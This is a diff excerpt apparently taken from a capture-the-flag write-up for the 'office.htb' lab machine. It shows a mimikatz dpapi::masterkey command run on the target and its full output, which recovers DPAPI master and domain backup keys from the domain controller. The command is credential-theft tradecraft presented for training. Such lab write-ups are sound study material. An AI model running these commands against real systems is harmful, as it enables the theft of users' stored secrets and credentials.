@@ -807,5 +807,61 @@ PS C:\Users\PPotts\Documents>
 Now its on the target 
 
 ```python
+PS C:\Users\PPotts\Documents> .\mimikatz.exe "dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" exit
 
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
+**MASTERKEYS**
+  dwVersion          : 00000002 - 2
+  szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+  dwFlags            : 00000000 - 0
+  dwMasterKeyLen     : 00000088 - 136
+  dwBackupKeyLen     : 00000068 - 104
+  dwCredHistLen      : 00000000 - 0
+  dwDomainKeyLen     : 00000174 - 372
+[masterkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : c521daa0857ee4fa6e4246266081e94c
+    rounds           : 00004650 - 18000
+    algHash          : 00008009 - 32777 (CALG_HMAC)
+    algCrypt         : 00006603 - 26115 (CALG_3DES)
+    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f
+
+[backupkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : a2741b13d7261697be4241ebbe05098a
+    rounds           : 00004650 - 18000
+    algHash          : 00008009 - 32777 (CALG_HMAC)
+    algCrypt         : 00006603 - 26115 (CALG_3DES)
+    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209
+
+[domainkey]
+  **DOMAINKEY**
+    dwVersion        : 00000002 - 2
+    dwSecretLen      : 00000100 - 256
+    dwAccesscheckLen : 00000058 - 88
+    guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
+    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
+    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665
+
+
+Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
+
+[backupkey] without DPAPI_SYSTEM: 
+  key : 4d1b2c18baba7442e79d33cc771bf54027ae2500e08da3ecfccf91303bd471b6
+  sha1: eeb787c4259e3c8b8408201ee5e54fc29fad22b2
+
+[domainkey] with RPC
+[DC] 'office.htb' will be the domain
+[DC] 'DC.office.htb' will be the DC server
+  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
 ```
